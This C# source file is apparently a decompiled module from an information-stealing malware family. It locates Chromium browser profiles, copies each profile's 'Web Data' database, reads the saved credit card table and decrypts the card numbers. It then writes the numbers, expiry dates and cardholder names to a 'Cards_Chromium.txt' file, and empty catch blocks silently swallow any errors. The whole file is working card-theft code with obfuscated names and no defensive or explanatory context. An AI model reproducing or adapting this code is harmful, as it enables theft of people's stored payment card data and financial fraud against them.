using Echelon;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

internal class p
{
	public static int a;

	public static void a(string aq)
	{
		try
		{
			List<string> list = t.a();
			Random random = new Random();
			foreach (string item in list)
			{
				try
				{
					using (StreamWriter streamWriter = new StreamWriter(aq + "\\Cards_Chromium.txt", append: true, Encoding.Default))
					{
						streamWriter.WriteLine($"Browser - {item}\n\n");
						string text = item + "\\Web Data";
						if (File.Exists(text))
						{
							string text2 = Global.AppDate + "\\System_" + random.Next(100000000);
							File.Copy(text, text2, overwrite: true);
							if (item.Contains("Guest Profile") | item.Contains("System Profile"))
							{
								File.Delete(text2);
							}
							else
							{
								x x = new x(text2);
								try
								{
									x.e("credit_cards");
									if (x.b() != 65536)
									{
										for (int i = 0; i < x.b(); i++)
										{
											string text3 = "";
											try
											{
												text3 = Encoding.UTF8.GetString(t.c(Encoding.Default.GetBytes(x.a(i, 4))));
												string text4 = x.a(i, 3);
												string text5 = x.a(i, 2);
												string text6 = x.a(i, 1);
												streamWriter.Write($"{text3}\t{text5}/{text4}\t {text6}");
												p.a++;
											}
											catch
											{
											}
										}
										streamWriter.WriteLine($"\n\n");
										File.Delete(text2);
									}
								}
								catch
								{
								}
							}
						}
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}
}
